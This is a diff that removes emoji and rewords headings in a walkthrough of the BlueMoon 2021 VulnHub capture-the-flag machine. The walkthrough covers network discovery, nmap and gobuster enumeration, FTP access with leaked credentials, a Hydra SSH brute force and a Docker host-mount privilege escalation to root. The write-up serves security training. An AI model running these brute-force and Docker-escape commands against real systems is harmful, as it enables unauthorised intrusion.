@@ -2,7 +2,7 @@
 
 # BlueMoon 2021 VulnHub Walkthrough
 
-## 🧠 Objective
+## Objective
 
 * Identify target machine
 * Enumerate open services
@@ -11,7 +11,7 @@
 
 ---
 
-## 🖥️ Lab Setup
+## Lab Setup
 
 * Attacker: Kali Linux
 * Attacker IP : 192.168.56.101
@@ -20,7 +20,7 @@
 
 ---
 
-## 🔍 Step 1 — Discover Attacker IP
+## Step 1 — Discover Attacker IP
 
 I used ifconfig to know the attacker's IP.
 
@@ -28,7 +28,7 @@ I used ifconfig to know the attacker's IP.
 ifconfig
 ```
 
-## 🔍 Step 2 — Discover Target IP
+## Step 2 — Discover Target IP
 
 And then, identify the target machine on the network.
 
@@ -36,17 +36,17 @@ And then, identify the target machine on the network.
 sudo netdiscover 
 ```
 
-📌 Look for a new IP that is not your Kali machine.
+Looking for a new IP that is not my kali machine.
 
 Example result:
 
-192.168.56.102 → Target Machine
+192.168.56.102 → target machine
 
 ---
 
-## 🚪 Step 3 — Port Scanning
+## Step 3 — Port Scanning
 
-Run a full scan to identify open ports and services.
+I run a full scan to identify open ports and services.
 
 ```
 nmap -sC -sV -Pn -vv 192.168.56.102
@@ -58,7 +58,7 @@ nmap -sC -sV -Pn -vv 192.168.56.102
 * Port 21 → FTP
 * Port 80 → HTTP (Web Server)
 
-## 🌐 Step 4 — Web Enumeration
+## Step 4 — Web Enumeration
 
 I used gobuster to perform brute-forcing command to discover hidden paths on a web server.
 
@@ -79,9 +79,9 @@ These are the directories that has been succesfully identified.
 user : user ftp passsword : fttp@ssword 
 ```
 
-## 🔑 Step 5 — FTP Access
+##  Step 5 — FTP Access
 
-### 🔐 Connecting to FTP
+### Connecting to FTP
 
 I attempted to connect to the FTP service on the target machine:
 
@@ -90,7 +90,7 @@ ftp 192.168.56.102
 ```
 ---
 
-### 📄 Enumerating Files
+### Enumerating Files
 
 Once inside the FTP server, I listed the available files:
 
@@ -109,7 +109,7 @@ These files looked interesting and potentially contained useful information such
 
 ---
 
-### ⬇️ Downloading Files
+### Downloading Files
 
 I downloaded both files to my local machine:
 
@@ -122,7 +122,7 @@ The transfer completed successfully.
 
 ---
 
-### 🚪 Exiting FTP
+### Exiting FTP
 
 ```bash
 exit
@@ -136,7 +136,7 @@ cat p_lists.txt
 ```
 
 
-## 🔓 SSH Brute Force (Hydra)
+## SSH Brute Force (Hydra)
 
 After obtaining a potential password list (`p_lists.txt`) from the FTP server, I used Hydra to perform a brute force attack on the SSH service.
 
@@ -146,7 +146,7 @@ hydra -l robin -P p_lists.txt 192.168.56.102 ssh
 
 ---
 
-### 📌 Result
+### Result
 
 Hydra successfully discovered valid SSH credentials:
 
@@ -158,7 +158,7 @@ This confirms that:
 - Username: `robin`
 - Password: `k4vr3ndh4nh4ck3r`
 
-### 🔐 Gaining Initial Access
+### Gaining Initial Access
 
 Using the discovered credentials, I logged into the target machine via SSH:
 
@@ -168,13 +168,13 @@ ssh robin@192.168.56.102
 
 ---
 
-## 📝 Executing feedback.sh
+## Executing feedback.sh
 
 During the enumeration phase, a script named `feedback.sh` was discovered. This script appears to collect user input and execute a shell.
 
 ---
 
-### 🔍 Running the Script
+### Running the Script
 
 To execute the script:
 
@@ -184,7 +184,7 @@ To execute the script:
 
 ---
 
-### 🧾 Interaction
+### Interaction
 
 The script prompts for user input:
 
@@ -207,7 +207,7 @@ jerry
 
 ---
 
-### 🧠 User Information
+### User Information
 
 ```
 id
@@ -216,7 +216,7 @@ id
 uid=1002(jerry) gid=1002(jerry) groups=1002(jerry),114(docker)
 
 
-### 🐳 Checking Available Docker Images
+### Checking Available Docker Images
 
 ```bash
 docker images
@@ -229,7 +229,7 @@ alpine       latest  28f6e2705743   5 years ago    5.61MB
 
 ---
 
-### 🚀 Exploiting Docker for Root Access
+### Exploiting Docker for Root Access
 
 I used Docker to mount the host filesystem and spawn a root shell:
 
@@ -239,7 +239,7 @@ docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/bash
 
 ---
 
-### ✅ Root Access Achieved
+### Root Access Achieved
 
 ```bash
 whoami
@@ -251,7 +251,7 @@ root
 
 ---
 
-### 🏁 Capturing Root Flag
+### Capturing Root Flag
 
 Navigate to root directory:
 
